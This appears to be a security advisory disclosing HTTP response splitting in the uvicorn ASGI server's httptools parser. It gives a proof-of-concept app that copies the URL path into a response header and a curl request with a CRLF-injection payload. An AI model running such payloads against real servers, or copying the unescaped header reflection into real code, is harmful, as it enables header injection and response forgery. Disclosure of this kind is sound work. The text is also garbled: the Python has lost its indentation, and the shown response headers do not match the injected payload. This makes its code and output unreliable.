# Overview

uvicorn is a lightning-fast ASGI server.

This package is vulnerable to HTTP Response Splitting. Uvicorn's implementation of the HTTP protocol for the httptools parser is vulnerable to HTTP response splitting. CRLF sequences are not escaped in the value of HTTP headers. Attackers can exploit this to add arbitrary headers to HTTP responses, or even return an arbitrary response body, whenever crafted input is used to construct HTTP headers.

## Proof of Concept

```
async def app(scope, receive, send):
assert scope['type'] == 'http'
await send({
'type': 'http.response.start',
'status': 200,
'headers': [
[b'Content-Type', b'text/plain'],
[b'Referer', scope['path'].encode()],
]
})
 await send({
'type': 'http.response.body',
'body': b'Hello, world!',
})
```

```
uvicorn poc-3:app --port 9999 --http httptools
```

To exploit this vulnerability, make a GET request with a crafted URL path like so:

```
curl -v 'http://localhost:9999/foo%0d%0ahuntr:%20dev'
```

Uvicorn will return an additional HTTP header "huntr" with the value "dev":

```
- Trying 127.0.0.1...
- Connected to localhost (127.0.0.1) port 9999 (#0)
  > GET /foo%0d%0ahuntr:%20dev HTTP/1.1
  > Host: localhost:9999
  > User-Agent: curl/7.58.0
  > Accept: _/_

< HTTP/1.1 200 OK
< server: uvicorn
< content-type: text/plain
< referer: /huntr
< dev: dev
< transfer-encoding: chunked
<
```
